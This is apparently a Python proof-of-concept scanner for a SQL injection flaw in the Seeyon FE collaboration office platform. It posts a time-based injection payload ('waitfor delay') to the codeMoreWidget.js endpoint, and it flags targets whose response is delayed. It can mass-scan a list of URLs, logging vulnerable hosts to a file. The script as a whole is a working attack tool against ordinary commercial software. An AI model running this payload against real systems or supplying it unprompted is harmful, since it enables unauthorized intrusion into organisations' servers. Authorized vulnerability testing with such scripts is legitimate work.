import http.client
import ssl
import argparse
from urllib.parse import urlparse
import time


def banner():
    banner = """

██╗  ██╗ █████╗  ██████╗██╗  ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝
███████║███████║██║     █████╔╝ 
██╔══██║██╔══██║██║     ██╔═██╗ 
██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝           
"""
    print(banner)


def check_vulnerability(url):
    try:
        parsed_url = urlparse(url)
        path = "/common/codeMoreWidget.js%70"

        body = "code=-1';waitfor delay '0:0:4'--"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0"
        }

        conn = None
        if parsed_url.scheme == "https":
            conn = http.client.HTTPSConnection(parsed_url.netloc, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(parsed_url.netloc)

        start_time = time.time()

        conn.request("POST", path, body=body, headers=headers)

        response = conn.getresponse()

        elapsed_time = time.time() - start_time

        if 4 <= elapsed_time <= 6:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{url}\n")
            print(f"{url} 存在致远互联FE协作办公平台 codeMoreWidget SQL注入致RCE漏洞")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except Exception as e:
        print(f"URL [{url}] 请求失败: {e}")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description='检测目标地址是否存在致远互联FE协作办公平台 codeMoreWidget SQL注入致RCE漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)


if __name__ == '__main__':
    main()